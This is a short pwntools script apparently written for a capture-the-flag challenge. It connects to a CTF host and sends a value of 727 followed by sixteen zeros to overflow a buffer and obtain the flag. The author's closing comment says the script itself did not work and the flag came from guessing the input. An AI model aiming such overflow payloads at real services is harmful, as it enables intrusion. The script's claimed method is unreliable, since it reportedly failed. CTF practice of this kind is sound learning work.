from pwn import *

# Establish a remote connection
io = remote('chal.osugaming.lol', 7279)

# Craft the payload
payload = b"727\n"  # Set pp to 727 to trigger the flag condition
payload += b"0" * 16  # Fill the buffer to overflow

# Send the payload
io.sendlineafter(b"How much pp did you get? ", payload)

# Receive and print the flag
print(io.recvall())
# This didn't work btw, but i guessed 0000000000000000 for 2nd input and somehow that did